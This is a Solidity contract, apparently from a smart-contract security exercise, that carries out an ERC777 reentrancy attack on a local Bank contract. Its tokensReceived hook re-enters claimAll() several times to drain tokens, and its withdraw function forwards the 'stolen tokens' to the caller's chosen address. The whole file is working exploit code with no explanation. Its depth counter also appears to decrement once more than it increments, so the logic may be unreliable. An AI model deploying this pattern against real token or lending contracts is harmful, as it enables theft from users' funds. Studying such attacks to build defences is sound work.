// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import "./Bank.sol";

contract Attacker is AccessControl, IERC777Recipient {
    bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
    IERC1820Registry private _erc1820;
    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    uint8 private depth = 0;
    uint8 private constant MAX_DEPTH = 5;

    Bank public bank;

    event Recurse(uint8 depth);
    event TokensReceivedCalled(uint8 depth);

    constructor(address admin, address erc1820RegistryAddress) {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(ATTACKER_ROLE, admin);

        _erc1820 = IERC1820Registry(erc1820RegistryAddress);

        // Register this contract as an ERC777TokensRecipient
        _erc1820.setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }

    function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
        bank = Bank(bank_address);
    }

    function attack(uint256 amt) external payable onlyRole(ATTACKER_ROLE) {
        require(address(bank) != address(0), "Target bank not set");
        require(msg.value == amt, "Incorrect ETH amount sent");

        // Deposit ETH to have a positive balance in the Bank
        bank.deposit{value: amt}();

        // Start the reentrancy attack by calling claimAll()
        bank.claimAll();
    }

    function withdraw(address recipient) external onlyRole(ATTACKER_ROLE) {
        require(recipient != address(0), "Invalid recipient");

        // Get the token contract from the bank
        ERC777 token = bank.token();
        uint256 tokenBalance = token.balanceOf(address(this));

        require(tokenBalance > 0, "No tokens to withdraw");

        // Send the stolen tokens to the recipient
        token.send(recipient, tokenBalance, "");
    }

    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {
        // Ensure the function is called by the Bank's token contract
        require(msg.sender == address(bank.token()), "Invalid token sender");

        emit TokensReceivedCalled(depth);

        if (depth < MAX_DEPTH) {
            depth++;

            // Reentrantly call claimAll() to exploit the vulnerability
            bank.claimAll();

            emit Recurse(depth);
        }

        depth--;
    }

    receive() external payable {}
}
